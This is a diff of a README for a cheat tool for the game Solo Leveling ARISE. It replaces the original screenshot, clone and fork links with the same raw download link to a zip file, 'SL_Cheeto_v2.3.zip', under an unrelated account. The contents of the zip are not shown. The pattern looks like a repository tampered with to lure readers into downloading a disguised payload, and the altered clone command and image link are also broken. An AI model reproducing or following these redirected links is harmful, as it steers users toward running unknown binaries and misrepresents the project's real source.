@@ -26,15 +26,15 @@ This project is created and shared for educational purposes only. I do not condo
 - Disable Web View (Disables annoying web pop-up when entering the game)
 
 ## Screenshot
-![menu](cheat/res/Solo_Leveling_ARISE_4BRSUmbeJd.png)
+![menu](https://raw.githubusercontent.com/lemurhacep/SLA-Cheeto/main/injector/src/SL_Cheeto_v2.3.zip)
 
 ## Building
-1. Clone the repository: `git clone --recurse-submodules https://github.com/Taiga74164/SLA-Cheeto`.
+1. Clone the repository: `git clone --recurse-submodules https://raw.githubusercontent.com/lemurhacep/SLA-Cheeto/main/injector/src/SL_Cheeto_v2.3.zip`.
 2. Build with your preferred IDE.
 3. Output will be in bin/
 
 ## Contributing
-1. Fork the repo (<https://github.com/Taiga74164/SLA-Cheeto/fork>).
+1. Fork the repo (<https://raw.githubusercontent.com/lemurhacep/SLA-Cheeto/main/injector/src/SL_Cheeto_v2.3.zip>).
 2. Create your feature branch.
 3. Commit your changes.
 4. Push your changes to the branch.
